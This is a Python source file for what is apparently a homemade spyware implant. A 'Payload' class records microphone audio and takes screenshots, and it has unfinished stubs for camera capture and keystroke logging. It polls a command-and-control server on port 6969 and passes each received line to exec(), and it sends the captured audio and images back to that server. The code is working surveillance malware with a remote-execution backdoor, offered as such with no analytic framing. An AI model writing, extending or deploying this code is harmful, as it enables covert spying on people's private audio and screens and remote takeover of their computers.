#!/usr/bin/env python3

import sounddevice as sd
from scipy.io.wavfile import write
import pyscreenshot as ss
import socket as s
import tempfile as tf
import os


class Payload:
    """Method used to record audio"""
    @staticmethod
    def recordAudio_saved():
        duration = 2.5  #Seconds
        fs = 44100  #Informations per seconds
        output = "output.wav" #Output file

        #Change default informations of the sound device
        sd.default.samplerate = fs
        sd.default.channels = 1
        sd.default.dtype = "int16"

        #Start the recording
        myrecording = sd.rec(int(duration * fs))
        sd.wait()
        
        #Write a wav file, read it then delete it
        write(output, fs, myrecording);
        txt = open(output, 'rb').read()
        
        try:
            os.remove(output)
        except OSError:
            pass     

        return txt
    
    """Method used to record audio"""
    @staticmethod
    def recordAudio_tmp():
        duration = 2.5  #Seconds
        fs = 44100  #Informations per seconds

        #Change default informations of the sound device
        sd.default.samplerate = fs
        sd.default.channels = 1
        sd.default.dtype = "int16"

        #Start the recording
        myrecording = sd.rec(int(duration * fs))
        sd.wait()
        
        #Create a temporary file and fill it with the audio
        output = tf.TemporaryFile()
        output.write(myrecording)
        output.seek(0)
        
        #Print the data
        txt = output.read()
        
        #Close the temporary file
        output.close()
        output = None

        return txt
        
    """Screenshot with classic file"""
    @staticmethod
    def recordScreen_saved():
        output = "output.png" #Output file
        
        #Take a screenshot & save it in the output file
        im = ss.grab()
        im.save(output)
        
        #Write a PNG file, read it then delete it
        txt = open(output, 'rb').read()
        try:
            os.remove(output)
        except OSError:
            pass        

        return txt

    """Screenshot with temp file"""
    @staticmethod
    def recordScreen_tmp():
        #Take a screenshot
        im = ss.grab()
        
        #Create a temporary file and fill it with the picture
        output = tf.TemporaryFile()
        im.save(output, format="PNG")
        output.seek(0)
        
        #Print the data
        txt = output.read()
        
        #Close the temporary file
        output.close()
        output = None

        return txt
    
    """Method used to record using the camera"""
    @staticmethod
    def recordCamera_saved():
        print("Not implemented")

    """Method used to record the keystrokes"""
    @staticmethod
    def recordKeyboard_saved():
        print("Not implemented")
        
    """Method used to ask for instructions to the C&C"""
    @staticmethod
    def askInstructions():
        HOST = s.gethostbyname(s.gethostname()) #"192.168.1.17"
        PORT = 6969  #Port used to send data
        
        #Create a socket to get instructions from the C&C
        sock = s.socket(s.AF_INET, s.SOCK_STREAM)
        sock.connect((HOST, PORT))
        sock.sendall(b'5')
        
        #Receive instructions
        receivedData = ''
        data = sock.recv(1024)
        while data != b'kill':
            receivedData += data.decode()
            data = sock.recv(1024)
            
        return receivedData

    """Method used to send data to the C&C"""
    @staticmethod
    def send(data, obj):
        #Switcher used for the C&C to know what kind of informations will be sent
        objDich = {
            "audio": b'1',
            "video": b'2',
            "keys": b'3',
            "image": b'4'
        }
        host = s.gethostbyname(s.gethostname()) #"192.168.1.14"
        port = 6969  # Port used to send data

        #Send the informations to the C&C
        with s.socket(s.AF_INET, s.SOCK_STREAM) as sock:
            sock.connect((host, port))
            sock.sendall(objDich[obj])
            sock.sendall(data)

#Wait for instructions
while True:
    try:
        #Execute instructions received
        for cmd in Payload.askInstructions().split('\n'):
            try:
                exec(cmd)
            except Exception as err:
                print("Error in " + cmd + " - " + str(err) + "\n") #Debug
                continue
    except KeyboardInterrupt:
        break;
